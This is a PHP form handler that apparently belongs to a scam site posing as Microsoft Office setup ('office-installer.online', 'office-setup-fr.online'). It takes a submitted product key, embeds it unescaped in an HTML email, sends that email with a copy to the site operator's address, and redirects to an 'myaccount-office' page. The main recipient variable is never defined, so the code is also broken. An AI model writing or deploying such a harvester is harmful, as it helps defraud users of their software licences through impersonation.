<?php
if(isset($_POST['submit']))
{
    $key = $_POST['productkey'];


    $fromc='info@office-installer.online';

    $toc=$email;

    $subjectc="Email Help Information";
	
	  $messagec='<html>
    <head>
        <title>Welcome to office-setup-fr.online</title>
    </head>
    <body>
        <h1>Thanks you for joining with us!</h1>
        <table cellspacing="0" style="border: 2px dashed #FB4314; width: 300px; height: 200px;">
            <tr>
                <th>Name:</th><td><strong>'.$key.'</strong></td>
            </tr>
        </table>
    </body>
    </html>';


    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

    $headers .= 'Cc:  info@office-installer.online' . "\r\n";
    $headers .= "From: Email <info@office-installer.online> \r\n";
    mail($toc, $subjectc, $messagec, $headers,'-fno-reply@office-installer.online');
	header('location: myaccount-office.html');
}
else{ 
header('location: myaccount-office.html');
exit(0);
}


?>